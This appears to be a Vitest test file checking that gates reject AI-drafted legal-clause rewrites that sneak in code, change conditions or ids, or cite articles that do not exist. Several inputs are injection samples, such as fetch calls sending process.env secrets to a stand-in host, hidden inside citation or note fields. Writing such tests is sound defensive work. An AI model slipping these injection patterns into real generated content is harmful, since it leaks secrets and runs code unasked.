import { describe, expect, it } from "vitest";
import { checkReplacement } from "@/legal/draft/gates";
import { locateTarget, type Span } from "@/legal/draft/locate";
import { FACTS } from "@/legal/facts";
import { legalDataModuleTexts } from "@/legal/index-texts";
import { allClauses } from "@/legal/registry";

const clause = (source: string): Span => ({ file: "src/legal/documents/x.ts", start: 0, end: source.length, source, kind: "clause" });
const ORIGINAL = `{
      id: "demo.uno",
      when: (ctx) => ctx.banks.length > 0,
      cites: [{ norm: "ds-016-2024-jus", art: "7" }],
      text: ({ company }) => \`Hola \${company.name}. Publica tu política.\`,
    }`;

describe("compuertas de un borrador", () => {
  it("todo texto de hoy, sin cambios, pasa las compuertas (no hay rechazos falsos)", () => {
    const targets = [...allClauses().map((c) => c.id), ...Object.keys(FACTS), ...legalDataModuleTexts().map((m) => m.source)];
    const rejected: string[] = [];
    for (const target of targets) {
      const span = locateTarget(target);
      if (!span) continue;
      const problems = checkReplacement(span, span.source);
      // Un hecho sin frase verificada (known-failures) no puede pasar hasta que se corrija.
      if (problems.length && !(span.kind === "fact" && FACTS[target]?.quote === null)) rejected.push(`${target}: ${problems.join("; ")}`);
    }
    expect(rejected).toEqual([]);
  }, 120_000);

  it("un texto reescrito con citas que existen pasa", () => {
    const next = ORIGINAL.replace("Publica tu política.", "Informa antes de recoger el dato (art. 18 de la Ley).").replace(
      '[{ norm: "ds-016-2024-jus", art: "7" }]',
      '[{ norm: "ds-016-2024-jus", art: "7" }, { norm: "ley-29733", art: "18" }]'
    );
    expect(checkReplacement(clause(ORIGINAL), next)).toEqual([]);
  });

  it("una expresión nueva en el texto se rechaza (la IA no puede meter código)", () => {
    const next = ORIGINAL.replace("Publica tu política.", "RUC \${company.ruc}.");
    expect(checkReplacement(clause(ORIGINAL), next).join(" ")).toMatch(/expresi[óo]n nueva/);
  });

  it("un «when» cambiado o quitado se rechaza", () => {
    expect(checkReplacement(clause(ORIGINAL), ORIGINAL.replace("ctx.banks.length > 0", "true")).join(" ")).toMatch(/when/);
    expect(checkReplacement(clause(ORIGINAL), ORIGINAL.replace("      when: (ctx) => ctx.banks.length > 0,\n", "")).join(" ")).toMatch(/when/);
  });

  it("un id cambiado, una propiedad nueva o código fuera del objeto se rechazan", () => {
    expect(checkReplacement(clause(ORIGINAL), ORIGINAL.replace("demo.uno", "demo.dos")).join(" ")).toMatch(/id/);
    expect(checkReplacement(clause(ORIGINAL), ORIGINAL.replace("cites:", "extra: 1,\n      cites:")).join(" ")).toMatch(/extra/);
    expect(checkReplacement(clause(ORIGINAL), `${ORIGINAL}; import fs from "node:fs"`)).not.toEqual([]);
    expect(checkReplacement(clause(ORIGINAL), `${ORIGINAL}, {}`)).not.toEqual([]);
  });

  it("revisión C1: código escondido fuera de «text» se rechaza (claim, clave repetida, varias declaraciones)", () => {
    const evilClaim = ORIGINAL.replace('art: "7" }', 'art: "7", claim: (fetch("https://x/?k=" + process.env.K), "texto") }');
    expect(checkReplacement(clause(ORIGINAL), evilClaim)).not.toEqual([]);
    const okClaim = ORIGINAL.replace('art: "7" }', 'art: "7", claim: "políticas de privacidad" }');
    expect(checkReplacement(clause(ORIGINAL), okClaim)).toEqual([]);
    const dupId = ORIGINAL.replace('id: "demo.uno",', 'id: (globalThis.x = 1, "demo.uno"),\n      id: "demo.uno",');
    expect(checkReplacement(clause(ORIGINAL), dupId).join(" ")).toMatch(/repetid/);
    expect(checkReplacement(clause(ORIGINAL), `${ORIGINAL}), y = (fetch("https://x")`)).not.toEqual([]);
  });

  it("revisión I8: un literal en posición de código dentro de «text» no puede cambiar", () => {
    const withCode = ORIGINAL.replace(
      "text: ({ company }) => `Hola ${company.name}. Publica tu política.`,",
      'text: ({ company }) => (company.flags.includes("cctv") ? "Con cámaras." : "Sin cámaras."),'
    );
    expect(checkReplacement(clause(withCode), withCode.replace("Con cámaras.", "Si tienes cámaras."))).toEqual([]);
    expect(checkReplacement(clause(withCode), withCode.replace('includes("cctv")', 'includes("todo")')).join(" ")).toMatch(/código/);
  });

  it("una cita repetida se rechaza", () => {
    const dup = ORIGINAL.replace('[{ norm: "ds-016-2024-jus", art: "7" }]', '[{ norm: "ds-016-2024-jus", art: "7" }, { norm: "ds-016-2024-jus", art: "7" }]');
    expect(checkReplacement(clause(ORIGINAL), dup).join(" ")).toMatch(/repetida/);
  });

  it("una cita a un artículo que no existe se rechaza", () => {
    const next = ORIGINAL.replace('art: "7"', 'art: "999"');
    expect(checkReplacement(clause(ORIGINAL), next).join(" ")).toMatch(/999/);
  });

  it("un hecho: la frase debe estar en el artículo y decir el valor", () => {
    const span = locateTarget("cctv.conservacion")!;
    expect(checkReplacement(span, span.source)).toEqual([]);
    expect(checkReplacement(span, span.source.replace("se almacenan por un plazo", "se guardan por un plazo")).join(" ")).toMatch(/frase/);
    expect(checkReplacement(span, span.source.replace('value: "30-60"', 'value: "30-90"')).join(" ")).toMatch(/valor/);
  });

  it("revisión C1/I7: un hecho no puede llevar código en note ni cambiar validFrom, y su frase debe decir la unidad", () => {
    const span = locateTarget("cctv.conservacion")!;
    const withNote = span.source.replace('quote: "', 'note: (fetch("https://x"), "nota"),\n    quote: "');
    expect(checkReplacement(span, withNote)).not.toEqual([]);
    const uit = locateTarget("uit.2026")!;
    expect(checkReplacement(uit, uit.source.replace('validFrom: "2026-01-01"', 'validFrom: "2020-01-01"')).join(" ")).toMatch(/validFrom/);
    const short = span.source.replace(/quote: "[^"]*"/, 'quote: "treinta (30) y sesenta (60)"');
    expect(checkReplacement(span, short).join(" ")).toMatch(/frase/);
  });

  it("un texto de módulo: sin código nuevo y con citas que existen", () => {
    const span = locateTarget("sector-legal:FAMILIES.condominio.norms[0]")!;
    expect(checkReplacement(span, '"Ley N.° 27157: la junta trata datos (art. 13 de la Ley N.° 29733)."')).toEqual([]);
    expect(checkReplacement(span, '"Ver art. 999 del DS N.° 016-2024-JUS."').join(" ")).toMatch(/999/);
    expect(checkReplacement(span, "`${process.env.X}`")).not.toEqual([]);
  });
});
